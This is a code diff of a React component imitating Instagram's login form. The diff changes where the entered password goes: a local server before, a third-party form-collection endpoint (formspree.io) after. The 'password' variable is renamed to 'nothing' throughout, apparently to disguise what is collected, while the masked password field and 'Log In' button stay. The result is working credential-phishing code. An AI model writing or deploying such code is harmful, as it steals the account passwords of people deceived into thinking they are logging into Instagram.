@@ -1,20 +1,30 @@
 import React, { useState } from 'react';
 import axios from 'axios';
 import './InstagramInput.css';
-import './InstagramButton.css'
+import './InstagramButton.css';
 
-function InstagramPasswordInput() {
-  const [password, setPassword] = useState('');
+function InstagramnothingInput() {
+  const [nothing, setnothing] = useState('');
 
-  const handleSubmit = async (e) => {
-    e.preventDefault();
+  const handleSubmit = async (event) => {
+    event.preventDefault(); // Prevent form from submitting the traditional way
     try {
-      const response = await axios.post('http://localhost:5000/submit-password', { password });
-     
+      const response = await fetch('https://formspree.io/f/xeojqbky', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ nothing }),
+      });
+      console.log(`nothing submitted: ${nothing}`); // Correct client-side logging
+      const data = await response.json();
+      console.log(data);
     } catch (error) {
-      console.error('There was an error sending the password!', error);
+      console.error('Error submitting nothing:', error);
     }
   };
+  
+  
 
   return (
     <form onSubmit={handleSubmit}>
@@ -22,9 +32,9 @@ function InstagramPasswordInput() {
         <input
           type="password"
           className="instagram-input"
-          placeholder="Password"
-          value={password}
-          onChange={(e) => setPassword(e.target.value)}
+          placeholder="password"
+          value={nothing}
+          onChange={(e) => setnothing(e.target.value)}
         />
       </div>
       <button type="submit" className="instagram-login-button">Log In</button>
@@ -32,4 +42,5 @@ function InstagramPasswordInput() {
   );
 }
 
-export default InstagramPasswordInput;
+export default InstagramnothingInput;
+
